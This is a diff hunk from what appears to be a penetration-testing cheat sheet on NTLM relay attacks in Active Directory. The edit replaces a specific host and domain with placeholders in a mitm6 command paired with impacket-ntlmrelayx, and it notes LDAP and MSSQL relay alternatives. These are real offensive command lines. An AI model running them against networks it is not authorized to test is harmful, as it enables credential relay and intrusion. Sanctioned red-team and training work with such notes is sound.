@@ -113,7 +113,7 @@ impacket-ntlmrelayx -tf relaylistOutputFilename.txt -smb2support
 mitm6 + NTLMrelayx
 
 ```bash
-sudo mitm6 -hw icorp-w10 -d internal.corp --ignore-nofqnd
+sudo mitm6 -hw <MICHMICH-COMPUTER> -d <domain.fqdn> --ignore-nofqnd
 impacket-ntlmrelayx -tf relaylistOutputFilename.txt -6 
 
 # If no smb available, try ldap/ldaps/mssql : 
